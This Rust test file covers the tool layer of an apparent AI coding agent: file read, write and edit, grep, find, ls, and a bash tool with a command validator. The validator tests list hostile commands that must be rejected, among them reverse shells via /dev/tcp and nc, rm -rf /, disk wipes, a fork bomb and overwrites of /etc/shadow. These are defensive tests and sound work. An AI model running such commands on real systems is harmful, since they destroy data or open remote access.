use super::file_ops::{make_unified_diff, truncate_out};
use super::shell_search::validate_bash_command;
use super::{resolve_under_cwd, run_tool, tool_definitions_json, MAX_TOOL_OUTPUT_CHARS};
use serde_json::json;
use std::fs;
use std::path::PathBuf;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

fn temp_workspace(name: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_else(|_| Duration::from_secs(0))
        .as_nanos();
    let path = std::env::temp_dir().join(format!("oxi-tools-{name}-{nanos}"));
    fs::create_dir_all(&path).unwrap();
    path
}

fn all_enabled() -> [bool; 7] {
    [true; 7]
}

// ─── resolve_under_cwd ───────────────────────────────────────────────

#[test]
fn resolve_under_cwd_relative_path() {
    let cwd = temp_workspace("resolve-rel");
    fs::write(cwd.join("hello.txt"), "hi").unwrap();
    let res = resolve_under_cwd(&cwd, "hello.txt");
    assert!(res.is_ok());
    assert!(res.unwrap().ends_with("hello.txt"));
}

#[test]
fn resolve_under_cwd_absolute_under_workspace() {
    let cwd = temp_workspace("resolve-abs");
    let file = cwd.join("sub").join("file.txt");
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(&file, "content").unwrap();
    let res = resolve_under_cwd(&cwd, file.to_str().unwrap());
    assert!(res.is_ok());
}

#[test]
fn resolve_under_cwd_rejects_escape() {
    let cwd = temp_workspace("resolve-escape");
    let res = resolve_under_cwd(&cwd, "/etc/passwd");
    assert!(res.is_err());
}

#[test]
fn resolve_under_cwd_rejects_dotdot_escape() {
    let cwd = temp_workspace("resolve-dotdot");
    let sibling = cwd.parent().unwrap().join(format!(
        "sibling-{}",
        cwd.file_name().unwrap().to_string_lossy()
    ));
    fs::create_dir_all(&sibling).unwrap();
    fs::write(sibling.join("secret.txt"), "x").unwrap();
    let rel = format!(
        "../{}/secret.txt",
        sibling.file_name().unwrap().to_string_lossy()
    );
    let res = resolve_under_cwd(&cwd, &rel);
    assert!(res.is_err());
}

// ─── validate_bash_command ───────────────────────────────────────────

#[test]
fn bash_allows_safe_commands() {
    assert!(validate_bash_command("ls -la").is_ok());
    assert!(validate_bash_command("cat foo.txt").is_ok());
    assert!(validate_bash_command("cargo build").is_ok());
    assert!(validate_bash_command("echo hello world").is_ok());
    assert!(validate_bash_command("git status").is_ok());
    assert!(validate_bash_command("find . -name '*.rs'").is_ok());
}

#[test]
fn bash_denies_rm_rf_root() {
    assert!(validate_bash_command("rm -rf /").is_err());
    assert!(validate_bash_command("rm -fr /").is_err());
    assert!(validate_bash_command("rm -rf --no-preserve-root /").is_err());
}

#[test]
fn bash_denies_sudo() {
    assert!(validate_bash_command("sudo apt install").is_err());
    assert!(validate_bash_command("doas cat /etc/shadow").is_err());
}

#[test]
fn bash_denies_privilege_escalation() {
    assert!(validate_bash_command("su -c whoami").is_err());
    assert!(validate_bash_command("su root").is_err());
    assert!(validate_bash_command("pkexec bash").is_err());
}

#[test]
fn bash_denies_disk_destruction() {
    assert!(validate_bash_command("mkfs.ext4 /dev/sda").is_err());
    assert!(validate_bash_command("dd if=/dev/zero of=/dev/sda").is_err());
    assert!(validate_bash_command("fdisk /dev/sda").is_err());
    assert!(validate_bash_command("wipefs -a /dev/sda").is_err());
}

#[test]
fn bash_denies_system_shutdown() {
    assert!(validate_bash_command("shutdown -h now").is_err());
    assert!(validate_bash_command("reboot").is_err());
    assert!(validate_bash_command("init 0").is_err());
    assert!(validate_bash_command("systemctl poweroff").is_err());
    assert!(validate_bash_command("halt").is_err());
}

#[test]
fn bash_denies_fork_bomb() {
    assert!(validate_bash_command(":(){ :|:& };:").is_err());
}

#[test]
fn bash_denies_reverse_shells() {
    assert!(validate_bash_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").is_err());
    assert!(validate_bash_command("nc -e /bin/sh 1.2.3.4 4444").is_err());
}

#[test]
fn bash_denies_kernel_modules() {
    assert!(validate_bash_command("insmod evil.ko").is_err());
    assert!(validate_bash_command("modprobe evil").is_err());
    assert!(validate_bash_command("rmmod module").is_err());
}

#[test]
fn bash_denies_overwriting_critical_files() {
    assert!(validate_bash_command("echo x > /etc/passwd").is_err());
    assert!(validate_bash_command("echo x > /etc/shadow").is_err());
    assert!(validate_bash_command("echo x > /dev/sda").is_err());
}

#[test]
fn bash_denies_iptables_flush() {
    assert!(validate_bash_command("iptables -f").is_err());
    assert!(validate_bash_command("iptables --flush").is_err());
}

#[test]
fn bash_normalizes_whitespace_for_deny() {
    // Extra spaces shouldn't bypass the deny list
    assert!(validate_bash_command("sudo  apt  install").is_err());
    assert!(validate_bash_command("rm  -rf  /").is_err());
}

// ─── tool_read ──────────────────────────────────────────────────────

#[test]
fn tool_read_basic() {
    let cwd = temp_workspace("read-basic");
    fs::write(cwd.join("test.txt"), "line1\nline2\nline3").unwrap();
    let res = run_tool(&cwd, "read", &json!({"path": "test.txt"}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("line1"));
    assert!(res.output.contains("line2"));
    assert!(res.output.contains("line3"));
}

#[test]
fn tool_read_with_offset_and_limit() {
    let cwd = temp_workspace("read-offset");
    let content: String = (1..=20)
        .map(|i| format!("line{i}"))
        .collect::<Vec<_>>()
        .join("\n");
    fs::write(cwd.join("data.txt"), &content).unwrap();
    let res = run_tool(
        &cwd,
        "read",
        &json!({"path": "data.txt", "offset": 5, "limit": 3}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.output.contains("line5"));
    assert!(res.output.contains("line7"));
    assert!(!res.output.contains("line8"));
}

#[test]
fn tool_read_missing_file() {
    let cwd = temp_workspace("read-missing");
    let res = run_tool(&cwd, "read", &json!({"path": "nope.txt"}), &all_enabled());
    assert!(res.is_error);
}

#[test]
fn tool_read_missing_path_arg() {
    let cwd = temp_workspace("read-no-arg");
    let res = run_tool(&cwd, "read", &json!({}), &all_enabled());
    assert!(res.is_error);
    assert!(res.output.contains("missing path"));
}

#[test]
fn tool_read_rejects_path_escape() {
    let cwd = temp_workspace("read-escape");
    let res = run_tool(
        &cwd,
        "read",
        &json!({"path": "/etc/passwd"}),
        &all_enabled(),
    );
    assert!(res.is_error);
}

// ─── tool_write ─────────────────────────────────────────────────────

#[test]
fn tool_write_creates_file() {
    let cwd = temp_workspace("write-create");
    let res = run_tool(
        &cwd,
        "write",
        &json!({"path": "new.txt", "content": "hello world"}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.output.contains("Wrote"));
    assert_eq!(
        fs::read_to_string(cwd.join("new.txt")).unwrap(),
        "hello world"
    );
}

#[test]
fn tool_write_creates_parent_dirs() {
    let cwd = temp_workspace("write-dirs");
    let res = run_tool(
        &cwd,
        "write",
        &json!({"path": "a/b/c.txt", "content": "deep"}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert_eq!(fs::read_to_string(cwd.join("a/b/c.txt")).unwrap(), "deep");
}

#[test]
fn tool_write_produces_diff() {
    let cwd = temp_workspace("write-diff");
    fs::write(cwd.join("existing.txt"), "old content").unwrap();
    let res = run_tool(
        &cwd,
        "write",
        &json!({"path": "existing.txt", "content": "new content"}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.diff.is_some());
    let diff = res.diff.unwrap();
    assert!(diff.contains("-old content"));
    assert!(diff.contains("+new content"));
}

#[test]
fn tool_write_missing_content() {
    let cwd = temp_workspace("write-no-content");
    let res = run_tool(&cwd, "write", &json!({"path": "x.txt"}), &all_enabled());
    assert!(res.is_error);
    assert!(res.output.contains("missing content"));
}

// ─── tool_edit ──────────────────────────────────────────────────────

#[test]
fn tool_edit_single_replacement() {
    let cwd = temp_workspace("edit-single");
    fs::write(cwd.join("code.rs"), "fn main() {}\n").unwrap();
    let res = run_tool(
        &cwd,
        "edit",
        &json!({
            "path": "code.rs",
            "edits": [{"oldText": "fn main() {}", "newText": "fn main() {\n    println!(\"hi\");\n}"}]
        }),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.diff.is_some());
    let content = fs::read_to_string(cwd.join("code.rs")).unwrap();
    assert!(content.contains("println"));
}

#[test]
fn tool_edit_rejects_ambiguous_match() {
    let cwd = temp_workspace("edit-ambiguous");
    fs::write(cwd.join("dup.txt"), "hello hello").unwrap();
    let res = run_tool(
        &cwd,
        "edit",
        &json!({
            "path": "dup.txt",
            "edits": [{"oldText": "hello", "newText": "world"}]
        }),
        &all_enabled(),
    );
    assert!(res.is_error);
    assert!(res.output.contains("2 occurrences"));
}

#[test]
fn tool_edit_rejects_no_match() {
    let cwd = temp_workspace("edit-no-match");
    fs::write(cwd.join("file.txt"), "content").unwrap();
    let res = run_tool(
        &cwd,
        "edit",
        &json!({
            "path": "file.txt",
            "edits": [{"oldText": "nonexistent", "newText": "new"}]
        }),
        &all_enabled(),
    );
    assert!(res.is_error);
    assert!(res.output.contains("0 occurrences"));
}

#[test]
fn tool_edit_no_edits_array() {
    let cwd = temp_workspace("edit-no-edits");
    fs::write(cwd.join("file.txt"), "content").unwrap();
    let res = run_tool(&cwd, "edit", &json!({"path": "file.txt"}), &all_enabled());
    assert!(res.is_error);
    assert!(res.output.contains("no edits"));
}

// ─── tool_bash ──────────────────────────────────────────────────────

#[test]
fn tool_bash_echo() {
    let cwd = temp_workspace("bash-echo");
    let res = run_tool(
        &cwd,
        "bash",
        &json!({"command": "echo hello"}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.output.contains("hello"));
    assert!(res.output.contains("exit code: 0"));
}

#[test]
fn tool_bash_cwd_respected() {
    let cwd = temp_workspace("bash-cwd");
    let res = run_tool(&cwd, "bash", &json!({"command": "pwd"}), &all_enabled());
    assert!(!res.is_error);
    let canonical = cwd.canonicalize().unwrap();
    assert!(res.output.contains(canonical.to_str().unwrap()));
}

#[test]
fn tool_bash_denied_sudo() {
    let cwd = temp_workspace("bash-sudo");
    let res = run_tool(
        &cwd,
        "bash",
        &json!({"command": "sudo rm -rf /"}),
        &all_enabled(),
    );
    assert!(res.is_error);
    assert!(res.output.contains("Refusing"));
}

#[test]
fn tool_bash_denied_fork_bomb() {
    let cwd = temp_workspace("bash-fork");
    let res = run_tool(
        &cwd,
        "bash",
        &json!({"command": ":(){ :|:& };:"}),
        &all_enabled(),
    );
    assert!(res.is_error);
    assert!(res.output.contains("Refusing"));
}

#[test]
fn tool_bash_timeout() {
    let cwd = temp_workspace("bash-timeout");
    let res = run_tool(
        &cwd,
        "bash",
        &json!({"command": "sleep 60", "timeout": 0.3}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.output.contains("timeout"));
}

#[test]
fn tool_bash_missing_command() {
    let cwd = temp_workspace("bash-no-cmd");
    let res = run_tool(&cwd, "bash", &json!({}), &all_enabled());
    assert!(res.is_error);
    assert!(res.output.contains("missing command"));
}

#[test]
fn tool_bash_nonzero_exit() {
    let cwd = temp_workspace("bash-exit");
    let res = run_tool(&cwd, "bash", &json!({"command": "exit 42"}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("exit code: 42"));
}

// ─── tool_grep ──────────────────────────────────────────────────────

#[test]
fn tool_grep_finds_match() {
    let cwd = temp_workspace("grep-match");
    fs::write(cwd.join("a.txt"), "apple\nbanana\ncherry").unwrap();
    let res = run_tool(&cwd, "grep", &json!({"pattern": "banana"}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("banana"));
    assert!(res.output.contains("a.txt:2"));
}

#[test]
fn tool_grep_no_match() {
    let cwd = temp_workspace("grep-no-match");
    fs::write(cwd.join("a.txt"), "hello\n").unwrap();
    let res = run_tool(&cwd, "grep", &json!({"pattern": "zzz"}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("No matches"));
}

#[test]
fn tool_grep_specific_file() {
    let cwd = temp_workspace("grep-file");
    fs::write(cwd.join("a.txt"), "alpha\n").unwrap();
    fs::write(cwd.join("b.txt"), "beta\n").unwrap();
    let res = run_tool(
        &cwd,
        "grep",
        &json!({"pattern": "alpha", "path": "a.txt"}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.output.contains("alpha"));
}

#[test]
fn tool_grep_with_limit() {
    let cwd = temp_workspace("grep-limit");
    let content: String = (1..=50)
        .map(|i| format!("match {i}"))
        .collect::<Vec<_>>()
        .join("\n");
    fs::write(cwd.join("big.txt"), &content).unwrap();
    let res = run_tool(
        &cwd,
        "grep",
        &json!({"pattern": "match", "limit": 5}),
        &all_enabled(),
    );
    assert!(!res.is_error);
    assert!(res.output.contains("match limit 5 reached"));
}

#[test]
fn tool_grep_missing_pattern() {
    let cwd = temp_workspace("grep-no-pattern");
    let res = run_tool(&cwd, "grep", &json!({}), &all_enabled());
    assert!(res.is_error);
}

// ─── tool_find ──────────────────────────────────────────────────────

#[test]
fn tool_find_glob() {
    let cwd = temp_workspace("find-glob");
    fs::write(cwd.join("a.rs"), "").unwrap();
    fs::write(cwd.join("b.txt"), "").unwrap();
    let res = run_tool(&cwd, "find", &json!({"pattern": "*.rs"}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("a.rs"));
    assert!(!res.output.contains("b.txt"));
}

#[test]
fn tool_find_missing_pattern() {
    let cwd = temp_workspace("find-no-pattern");
    let res = run_tool(&cwd, "find", &json!({}), &all_enabled());
    assert!(res.is_error);
}

// ─── tool_ls ────────────────────────────────────────────────────────

#[test]
fn tool_ls_basic() {
    let cwd = temp_workspace("ls-basic");
    fs::write(cwd.join("file1.txt"), "").unwrap();
    fs::write(cwd.join("file2.txt"), "").unwrap();
    fs::create_dir(cwd.join("subdir")).unwrap();
    let res = run_tool(&cwd, "ls", &json!({}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("file1.txt"));
    assert!(res.output.contains("file2.txt"));
    assert!(res.output.contains("subdir"));
}

#[test]
fn tool_ls_empty_dir() {
    let cwd = temp_workspace("ls-empty");
    let sub = cwd.join("empty");
    fs::create_dir(&sub).unwrap();
    let res = run_tool(&cwd, "ls", &json!({"path": "empty"}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("[empty directory]"));
}

#[test]
fn tool_ls_with_limit() {
    let cwd = temp_workspace("ls-limit");
    for i in 0..10 {
        fs::write(cwd.join(format!("file{i:02}.txt")), "").unwrap();
    }
    let res = run_tool(&cwd, "ls", &json!({"limit": 3}), &all_enabled());
    assert!(!res.is_error);
    assert!(res.output.contains("limit 3 reached"));
}

// ─── run_tool routing ───────────────────────────────────────────────

#[test]
fn run_tool_unknown_tool() {
    let cwd = temp_workspace("unknown");
    let res = run_tool(&cwd, "destroy", &json!({}), &all_enabled());
    assert!(res.is_error);
    assert!(res.output.contains("Unknown tool"));
}

#[test]
fn run_tool_disabled_tool() {
    let cwd = temp_workspace("disabled");
    let mut enabled = all_enabled();
    enabled[0] = false; // disable "read"
    let res = run_tool(&cwd, "read", &json!({"path": "x"}), &enabled);
    assert!(res.is_error);
    assert!(res.output.contains("disabled"));
}

// ─── tool_definitions_json ──────────────────────────────────────────

#[test]
fn tool_definitions_all_enabled() {
    let defs = tool_definitions_json(&all_enabled());
    assert_eq!(defs.len(), 7);
    let names: Vec<&str> = defs
        .iter()
        .filter_map(|d| d.get("function")?.get("name")?.as_str())
        .collect();
    assert!(names.contains(&"read"));
    assert!(names.contains(&"bash"));
    assert!(names.contains(&"ls"));
}

#[test]
fn tool_definitions_some_disabled() {
    let mut enabled = [false; 7];
    enabled[0] = true; // only "read"
    let defs = tool_definitions_json(&enabled);
    assert_eq!(defs.len(), 1);
}

// ─── make_unified_diff ──────────────────────────────────────────────

#[test]
fn unified_diff_empty_for_identical() {
    let diff = make_unified_diff("f.txt", "hello", "hello");
    assert!(diff.is_empty());
}

#[test]
fn unified_diff_shows_changes() {
    let diff = make_unified_diff("f.txt", "line1\nline2\nline3", "line1\nchanged\nline3");
    assert!(diff.contains("-line2"));
    assert!(diff.contains("+changed"));
    assert!(diff.contains("--- a/f.txt"));
    assert!(diff.contains("+++ b/f.txt"));
}

#[test]
fn unified_diff_new_file() {
    let diff = make_unified_diff("new.txt", "", "new content\nsecond line");
    assert!(diff.contains("+new content"));
    assert!(diff.contains("+second line"));
}

// ─── truncate_out ───────────────────────────────────────────────────

#[test]
fn truncate_out_short_unchanged() {
    let s = "short".to_string();
    assert_eq!(truncate_out(s.clone()), s);
}

#[test]
fn truncate_out_long_capped() {
    let s = "x".repeat(MAX_TOOL_OUTPUT_CHARS + 100);
    let truncated = truncate_out(s);
    assert!(truncated.len() < MAX_TOOL_OUTPUT_CHARS + 200);
    assert!(truncated.contains("[output truncated"));
}
